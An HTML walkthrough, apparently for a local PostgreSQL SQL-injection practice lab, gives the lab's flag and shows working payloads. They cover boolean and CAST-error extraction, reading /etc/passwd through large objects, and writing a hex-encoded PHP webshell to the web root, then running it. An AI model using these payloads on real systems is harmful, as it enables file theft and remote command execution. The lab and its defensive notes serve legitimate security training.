<h4>Step 1: Explore the Gallery Search</h4>
<p>
    Start by testing the image search to understand how it works.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Baseline Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab12" \<br> --data-urlencode "search=sunset"<br><br>
        <span class="prompt">Response: </span>1 | sunset_beach.jpg | Golden sunset over a tropical beach with palm trees.
    </div>
</div>

<h4>Step 2: Confirm SQL Injection</h4>
<p>
    Verify the injection point by testing boolean conditions.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Injection Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab12" \<br> --data-urlencode "search=' AND 1=1 -- -"<br>
        <span class="prompt">Response: </span>All 5 images returned (TRUE condition -- all rows match)<br>
        &nbsp;&nbsp;[sunset_beach.jpg, mountain_peak.png, city_skyline.jpg, forest_trail.png, ocean_waves.jpg]<br><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab12" \<br> --data-urlencode "search=' AND 1=2 -- -"<br>
        <span class="prompt">Response: </span>No images found matching your search. (FALSE condition)<br>
        <span class="prompt">Note: </span>Use empty prefix (not 'sunset') because trailing wildcard is commented out
    </div>
</div>

<h4>Step 3: Error-Based Extraction with CAST</h4>
<p>
    Extract the system secret using the CAST error technique.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. CAST Error Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab12" \<br> --data-urlencode "search=' AND 1=CAST((SELECT secret_value FROM system_secrets LIMIT 1) AS INTEGER) -- -"<br><br>
        <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_l4rg3_0bj3ct_4bus3}"
    </div>
</div>

<h4>Step 4: Submit the Flag</h4>
<p>
    Copy the flag from the error message and paste it into the verification form:
    <code>FLAG{pg_l4rg3_0bj3ct_4bus3}</code>.
</p>

<h4>Step 5: Understanding Large Objects (Advanced Concept)</h4>
<p>
    PostgreSQL large objects provide a mechanism to store binary data up to 4TB.
    The large object functions can be abused to read and write arbitrary files
    on the server filesystem.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Large Object Read Chain (Conceptual)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Step A: Import a server file into a large object</span><br>
        <span class="prompt">Payload: </span>'; SELECT lo_import('/etc/passwd'); -- -<br>
        <span class="prompt">Result: </span>Returns OID (e.g., 16445)<br><br>
        <span class="prompt">// Step B: Read the large object content</span><br>
        <span class="prompt">Payload: </span>' UNION SELECT 1, convert_from(lo_get(16445), 'UTF8'), '' -- -<br>
        <span class="prompt">Result: </span>Displays the contents of /etc/passwd<br><br>
        <span class="prompt">// Step C: Alternative -- use CAST to extract via error</span><br>
        <span class="prompt">Payload: </span>' AND 1=CAST(convert_from(lo_get(16445), 'UTF8') AS INTEGER) -- -<br>
        <span class="prompt">Result: </span>Error message contains first line of /etc/passwd<br><br>
        <span class="prompt">// Step D: Clean up</span><br>
        <span class="prompt">Payload: </span>'; SELECT lo_unlink(16445); -- -
    </div>
</div>

<h4>Step 6: Large Object Write Chain</h4>
<p>
    Large objects can also be used to write files to the server: enabling webshell
    deployment or configuration tampering:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Large Object Write Chain (Conceptual)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Step A: Create a new large object</span><br>
        <span class="prompt">Payload: </span>'; SELECT lo_creat(-1); -- -<br>
        <span class="prompt">Result: </span>Returns OID (e.g., 16446)<br><br>
        <span class="prompt">// Step B: Write webshell content into the large object</span><br>
        <span class="prompt">Payload: </span>'; INSERT INTO pg_largeobject (loid, pageno, data) VALUES (16446, 0, decode('3c3f706870206563686f2073797374656d28245f524551554553545b27636d64275d293b3f3e', 'hex')); -- -<br>
        <span class="prompt">Hex decodes to: </span>&lt;?php echo system($_REQUEST['cmd']);?&gt;<br><br>
        <span class="prompt">// Step C: Export the large object to web root</span><br>
        <span class="prompt">Payload: </span>'; SELECT lo_export(16446, '/var/www/html/shell.php'); -- -<br>
        <span class="prompt">Effect: </span>Webshell deployed at http://target/shell.php<br><br>
        <span class="prompt">// Step D: Access the webshell</span><br>
        <span class="prompt">$ </span>curl http://target/shell.php?cmd=id<br>
        <span class="prompt">Response: </span>uid=33(www-data) gid=33(www-data) groups=33(www-data)
    </div>
</div>

<h4>Step 7: Reading Specific File Portions</h4>
<p>
    For large files, you can read specific byte ranges using <code>lo_get</code>
    with offset and length parameters:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Partial File Reads</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Read bytes 0-100 of a large object</span><br>
        <span class="prompt">Payload: </span>' UNION SELECT 1, convert_from(lo_get(16445, 0, 100), 'UTF8'), '' -- -<br><br>
        <span class="prompt">// Read bytes 100-200</span><br>
        <span class="prompt">Payload: </span>' UNION SELECT 1, convert_from(lo_get(16445, 100, 100), 'UTF8'), '' -- -<br><br>
        <span class="prompt">// Get the total size of the large object</span><br>
        <span class="prompt">Payload: </span>' AND 1=CAST((SELECT length(lo_get(16445))::text) AS INTEGER) -- -<br>
        <span class="prompt">Result: </span>Error reveals the file size in bytes
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> PostgreSQL's large object system (<code>lo_import</code>,
    <code>lo_get</code>, <code>lo_export</code>) provides a powerful file read/write
    capability that can be exploited through SQL injection. Unlike <code>COPY TO PROGRAM</code>,
    large object functions may be available to non-superuser accounts if they have been
    granted the <code>pg_read_server_files</code> or <code>pg_write_server_files</code>
    predefined roles. Defense: restrict large object permissions, use prepared statements,
    and monitor the <code>pg_largeobject</code> system catalog for unexpected entries.
</div>
